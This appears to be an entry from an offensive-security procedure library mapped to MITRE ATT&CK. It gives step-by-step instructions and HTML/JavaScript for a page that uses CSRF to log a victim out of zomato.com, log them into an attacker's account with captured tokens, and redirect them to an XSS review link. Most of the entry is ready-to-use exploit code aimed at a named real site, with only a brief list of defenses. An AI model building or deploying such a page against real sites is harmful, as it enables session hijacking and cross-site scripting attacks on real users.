---
id: proc-632017-04
tags:
  - csrf
  - malicious-page
  - phishing
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/malicious-csrf-page]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:49.946Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-Auto-Login-Page

## Summary

This procedure creates an HTML page that exploits CSRF to log out the victim, auto-login the attacker's account using captured tokens, and redirect to the XSS review page.

## Description

The page uses an <img> for logout CSRF, a hidden form for login CSRF to /php/asyncLogin.php, and JS timeouts for sequencing. No CSRF protection on these endpoints allows this. Prerequisites: Captured tokens from Step 3; XSS review link. Outcome: Session hijack setup.

## Requirements

1. Captured authResponse tokens
2. XSS review URL (e.g., shortened http://zoma.to/link_to_review)
3. Web server to host the HTML page
4. Basic HTML/JS knowledge

## Defense

Defensive measures and detection strategies:

- Add CSRF tokens to logout and login endpoints
- SameSite=Strict cookies for session management
- Monitor for cross-origin form submissions
- URL scanning for suspicious redirects

## Objectives

1. Force victim logout via CSRF
2. Impersonate attacker login via CSRF
3. Redirect to trigger XSS

## Instructions

### Step 1: Build the HTML Structure

**Context**: Create form for login and img for logout.

**Command** ([[commands/malicious-csrf-page]]):
```html
<form target="attackerTokens" method="post" action="https://www.zomato.com/php/asyncLogin.php?access_token=██████">
<input name='authResponse[accessToken]' value='█████'>
<input name='authResponse[userID]' value='███'>
<input name='authResponse[expiresIn]' value='5073'>
<input name='authResponse[signedRequest]' value='████'>
<input name='authResponse[reauthorize_required_in]' value='7774406'>
<input name='authResponse[data_access_expiration_time]' value='1569568133'>
<input type=submit>
</form>
<iframe name="attackerTokens"></iframe>
<!-- logout current session -->
<img src="https://www.zomato.com/logout">
```

> Replace placeholders with captured values.

### Step 2: Add JavaScript Timing

**Context**: Sequence actions with setTimeout.

**Command** ([[commands/malicious-csrf-page]] continuation):
```html
<script>
setTimeout(function(){ document.forms[0].submit();},1500);// login attackers account
setTimeout(function(){ window.location.href='http://zoma.to/link_to_review';},4000);// redirect to XSS payload page
</script>
```

> Expected: Page auto-executes on load; test in browser.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/malicious-csrf-page]]

## Tools Used


## Tags

- [[csrf]]
- [[malicious-page]]
- [[Phishing]]
